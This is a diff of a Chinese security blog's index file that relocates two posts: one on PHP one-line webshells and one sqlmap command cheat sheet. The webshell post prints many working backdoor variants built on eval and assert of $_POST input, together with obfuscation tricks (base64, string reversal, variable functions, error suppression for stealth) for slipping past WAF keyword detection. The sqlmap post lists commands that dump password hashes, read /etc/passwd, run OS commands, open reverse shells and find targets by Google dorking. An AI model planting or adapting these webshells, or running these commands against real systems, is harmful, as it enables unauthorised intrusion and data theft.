+<p>经典一句话木马大多只有两个部分：可执行函数部分和接收数据部分</p>
+<a id="more"></a>
+<h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><figure class="highlight php"><figcaption><span>http://test.local/post.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>http://test.local/post.php</code> &gt;&gt; 浏览器插件 <code>HackBar</code> &gt;&gt; <code>Enable POST</code> &gt;&gt; <code>a=phpinfo();</code> </p>
+<figure class="highlight php"><figcaption><span>http://test.loacl/get.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>http://test.local/get.php?test=phpinfo();</code></p>
+<h1 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h1><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a><code>assert</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a><code>create_function</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = @create_function(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">@<span class="variable">$fun</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="call-user-func-回调函数"><a href="#call-user-func-回调函数" class="headerlink" title="call_user_func 回调函数"></a><code>call_user_func</code> 回调函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func(assert,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>call_user_func</code> 函数的第一个参数调用其他函数，第二个参数为该调用函数传参。一些被waf拦截的的可配合这个函数绕过waf。</p>
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><code>preg_replace</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/abcde/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>],<span class="string">&quot;abcdefg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该函数利作用是使用正则表达式替换符合条件的字符串，但该函数可执行命令。函数的第一个参数是正则表达式，按照 PHP 的格式，表达式在<code>/</code>间，若在<code>/</code>末尾加 <code>e</code>，这个函数的第二个参数就会被当作代码执行。</p>
+<h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a><code>file_put_contents</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];assert(<span class="variable">$a</span>)<span class="meta">?&gt;</span>;</span><br><span class="line">@file_put_contents(<span class="string">&quot;Biu.php,<span class="subst">$test</span>&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用函数生成木马文件，第一个参数是文件名，第二个参数是文件内容</p>
+<h1 id="一句话木马绕过waf"><a href="#一句话木马绕过waf" class="headerlink" title="一句话木马绕过waf"></a>一句话木马绕过waf</h1><p>WAF （Web 应用防火墙）用于保护 Web 应用不被各类应用层攻击,如跨站脚本(XSS)、SQL注入、cookie中毒等，通常以关键字判断是否为一句话木马。</p>
+<p><strong>本节仅是绕过一些基础的关键字查杀 WAF，更多免杀请产考：</strong><a href="https://xz.aliyun.com/t/9246">免杀/一句话木马(PHP)</a></p>
+<h2 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h2><p><strong>变量函数(可变函数)</strong> : 变量名后有圆括号，PHP将寻找与变量的值同名的函数，并尝试执行。<strong>即使用变量作为函数名的函数</strong></p>
+<p><strong>注意: eval是一个语言构造器而不是一个函数，不能被变量函数调用。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line">@<span class="variable">$test</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有时需要使用大小写混淆、字符串拼接、字符串逆序等变化达到绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;TR&quot;</span>.<span class="string">&quot;Es&quot;</span>.<span class="string">&quot;sA&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=strtolower(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=strrev(<span class="variable">$b</span>)</span><br><span class="line">@<span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p><strong>eval不可用，与可变函数同理</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$bb</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>= <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">@<span class="variable">$$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>$$a = $&#123;$a&#125; = $&#123;&#39;bb&#39;&#125; = $bb = &quot;assert&quot;</code></p>
+<h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace 函数"></a><code>str_replace</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&quot;Hell&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;assHellert&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在第三个参数中查找第一个参数，并将其替换为第二个参数，这里第二个参数为空字符串，相应删除 <code>Hell</code></p>
+<h2 id="base64-decode-函数"><a href="#base64-decode-函数" class="headerlink" title="base64_decode 函数"></a><code>base64_decode</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=base64_decode(<span class="string">&quot;YXNzZXJ0&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>YXNzZXJ0</code> 是 <code>assert</code> 的base64编码</p>
+<h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str 函数"></a><code>parse_str</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(<span class="string">&quot;a=assert&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>生成变量 <code>a</code> 并赋值 <code>assert</code></p>
+<h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;@<span class="keyword">eval</span>(<span class="variable">$a</span>)&#125;;</span><br><span class="line">@fun(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用自定义函数调用<code>eval</code></p>
+<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p>通常都是使用多个组合才能达到绕过 WAF 的目的。</p>
+<p>在函数前加 <code>@</code> 符，可让php语句不显示错误信息，加强隐蔽性。</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+        <tag>木马</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OpenWrt编译</title>
     <url>/posts/f0343180/</url>
     <content><![CDATA[<h1 id="OpenWrt"><a href="#OpenWrt" class="headerlink" title="OpenWrt"></a>OpenWrt</h1><p><a href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt WiKi</a></p>
@@ -7447,54 +7500,6 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </categories>
       <tags>
         <tag>OpenWrt</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP一句话</title>
-    <url>/posts/77b49f04/</url>
-    <content><![CDATA[<h1 id="一句话木马原理"><a href="#一句话木马原理" class="headerlink" title="一句话木马原理"></a>一句话木马原理</h1><p><code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code> 是一句话后面中最经典的一种，，其原理是：通过 <code>POST</code> 、<code>GET</code> 、<code>COOKIE</code> 三种方式获取参数 <code>hack</code> 的值，通过 <code>eval()</code> 函数执行 <code>hack</code> 中的PHP代码，这样就能通过一句话木马在网站执行传递过去的任意PHP语句。</p>
-<p>经典一句话木马大多只有两个部分：可执行函数部分和接收数据部分</p>
-<a id="more"></a>
-<h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><figure class="highlight php"><figcaption><span>http://test.local/post.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>http://test.local/post.php</code> &gt;&gt; 浏览器插件 <code>HackBar</code> &gt;&gt; <code>Enable POST</code> &gt;&gt; <code>a=phpinfo();</code> </p>
-<figure class="highlight php"><figcaption><span>http://test.loacl/get.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>http://test.local/get.php?test=phpinfo();</code></p>
-<h1 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h1><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a><code>assert</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a><code>create_function</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = @create_function(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">@<span class="variable">$fun</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="call-user-func-回调函数"><a href="#call-user-func-回调函数" class="headerlink" title="call_user_func 回调函数"></a><code>call_user_func</code> 回调函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func(assert,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>call_user_func</code> 函数的第一个参数调用其他函数，第二个参数为该调用函数传参。一些被waf拦截的的可配合这个函数绕过waf。</p>
-<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><code>preg_replace</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/abcde/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>],<span class="string">&quot;abcdefg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>该函数利作用是使用正则表达式替换符合条件的字符串，但该函数可执行命令。函数的第一个参数是正则表达式，按照 PHP 的格式，表达式在<code>/</code>间，若在<code>/</code>末尾加 <code>e</code>，这个函数的第二个参数就会被当作代码执行。</p>
-<h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a><code>file_put_contents</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];assert(<span class="variable">$a</span>)<span class="meta">?&gt;</span>;</span><br><span class="line">@file_put_contents(<span class="string">&quot;Biu.php,<span class="subst">$test</span>&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>利用函数生成木马文件，第一个参数是文件名，第二个参数是文件内容</p>
-<h1 id="一句话木马绕过waf"><a href="#一句话木马绕过waf" class="headerlink" title="一句话木马绕过waf"></a>一句话木马绕过waf</h1><p>WAF （Web 应用防火墙）用于保护 Web 应用不被各类应用层攻击,如跨站脚本(XSS)、SQL注入、cookie中毒等，通常以关键字判断是否为一句话木马。</p>
-<p><strong>本节仅是绕过一些基础的关键字查杀 WAF，更多免杀请产考：</strong><a href="https://xz.aliyun.com/t/9246">免杀/一句话木马(PHP)</a></p>
-<h2 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h2><p><strong>变量函数(可变函数)</strong> : 变量名后有圆括号，PHP将寻找与变量的值同名的函数，并尝试执行。<strong>即使用变量作为函数名的函数</strong></p>
-<p><strong>注意: eval是一个语言构造器而不是一个函数，不能被变量函数调用。</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line">@<span class="variable">$test</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有时需要使用大小写混淆、字符串拼接、字符串逆序等变化达到绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;TR&quot;</span>.<span class="string">&quot;Es&quot;</span>.<span class="string">&quot;sA&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=strtolower(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=strrev(<span class="variable">$b</span>)</span><br><span class="line">@<span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p><strong>eval不可用，与可变函数同理</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$bb</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>= <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">@<span class="variable">$$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>$$a = $&#123;$a&#125; = $&#123;&#39;bb&#39;&#125; = $bb = &quot;assert&quot;</code></p>
-<h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace 函数"></a><code>str_replace</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&quot;Hell&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;assHellert&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在第三个参数中查找第一个参数，并将其替换为第二个参数，这里第二个参数为空字符串，相应删除 <code>Hell</code></p>
-<h2 id="base64-decode-函数"><a href="#base64-decode-函数" class="headerlink" title="base64_decode 函数"></a><code>base64_decode</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=base64_decode(<span class="string">&quot;YXNzZXJ0&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>YXNzZXJ0</code> 是 <code>assert</code> 的base64编码</p>
-<h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str 函数"></a><code>parse_str</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(<span class="string">&quot;a=assert&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-<p>生成变量 <code>a</code> 并赋值 <code>assert</code></p>
-<h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;@<span class="keyword">eval</span>(<span class="variable">$a</span>)&#125;;</span><br><span class="line">@fun(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用自定义函数调用<code>eval</code></p>
-<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p>通常都是使用多个组合才能达到绕过 WAF 的目的。</p>
-<p>在函数前加 <code>@</code> 符，可让php语句不显示错误信息，加强隐蔽性。</p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>安全</tag>
-        <tag>木马</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -7709,6 +7714,22 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </tags>
   </entry>
   <entry>
+    <title>SqlMap语法</title>
+    <url>/posts/4e30d5d2/</url>
+    <content><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基础步骤</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-user <span class="comment">#获取当前用户名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tables -D <span class="string">&quot;db_name&quot;</span> <span class="comment">#列表名</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --columns -T <span class="string">&quot;tablename&quot;</span> users-D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#列字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;column_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#获取字段内容</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 信息获取</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --smart --level 3 --users <span class="comment"># smart 智能 level 执行测试等级</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://92.168.109.139/news?id=1&quot;</span> --dbms <span class="string">&quot;Mysql&quot;</span> --users <span class="comment"># dbms 指定数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --users <span class="comment">#列数据库用户</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs<span class="comment">#列数据库</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords <span class="comment">#数据库用户密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords-U root -v 0 <span class="comment">#列出指定用户数据库密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;password,user,id&quot;</span> -T <span class="string">&quot;tablename&quot;</span> -D <span class="string">&quot;db_name&quot;</span> --start 1 --stop 20 <span class="comment">#列出指定字段，列出 20 条</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all -v 0 <span class="comment">#列出所有数据库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges <span class="comment">#查看权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges -U root <span class="comment">#查看指定用户权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --is-dba -v 1 <span class="comment">#是否是数据库管理员</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --roles <span class="comment">#枚举数据库用户角色</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --udf-inject <span class="comment">#导入用户自定义函数（获取系统权限！）</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all --exclude-sysdbs -v 0 <span class="comment">#列出当前库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --union-cols <span class="comment">#union 查询表记录</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http:/192.168.56.3/news?id=1&quot;</span> --cookie <span class="string">&quot;COOKIE_VALUE&quot;</span> <span class="comment">#cookie 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -b <span class="comment">#获取 banner 信息</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --data <span class="string">&quot;id=3&quot;</span> <span class="comment">#post 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -v 1 -f <span class="comment">#指纹判别数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --proxy<span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#代理注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span>--string<span class="string">&quot;STRING_ON_TRUE_PAGE&quot;</span> <span class="comment">#指定关键词</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --sql-shell <span class="comment">#执行指定 sql 命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file /etc/passwd  <span class="comment">#必须为dbs权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file-write 本地文件路径 file-dest 目标路径  <span class="comment">#必须为dbs权限(可将本地的某个文件写入到目标路径下)</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-cmd=whoami <span class="comment">#执行系统命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-shell <span class="comment">#系统交互 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-pwn <span class="comment">#反弹 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --reg-read <span class="comment">#读取 win 系统注册表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs-o <span class="string">&quot;sqlmap.log&quot;</span> <span class="comment">#保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs -o <span class="string">&quot;sqlmap.log&quot;</span> --resume <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --msf-path=/opt/metasploit3/msf2 --os-pwn 反弹 shell 需 metasploit 路径</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --batch --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap -g <span class="string">&quot;google 语法&quot;</span> --dump-all --batch <span class="comment">#google 搜索注入点自动 跑出所有字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --forms  <span class="comment">#post提交方式注入</span></span><br><span class="line">sqlmap.py -r 本地数据包路径 <span class="comment">#post提交方式注入</span></span><br></pre></td></tr></table></figure>
+<h1 id="例"><a href="#例" class="headerlink" title="例"></a>例</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406&quot;</span> --string=<span class="string">&quot;Surname&quot;</span> --dbms=mysql --users --password</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>SqlMap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入与SQL忙注漏洞</title>
     <url>/posts/cf6db6a/</url>
     <content><![CDATA[<h1 id="一、绕过WAF的方法："><a href="#一、绕过WAF的方法：" class="headerlink" title="一、绕过WAF的方法："></a>一、绕过WAF的方法：</h1><ul>
@@ -7764,22 +7785,6 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       <tags>
         <tag>安全</tag>
         <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SqlMap语法</title>
-    <url>/posts/4e30d5d2/</url>
-    <content><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基础步骤</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-user <span class="comment">#获取当前用户名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tables -D <span class="string">&quot;db_name&quot;</span> <span class="comment">#列表名</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --columns -T <span class="string">&quot;tablename&quot;</span> users-D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#列字段</span></span><br><span class="line">sqlmap.py -u <span 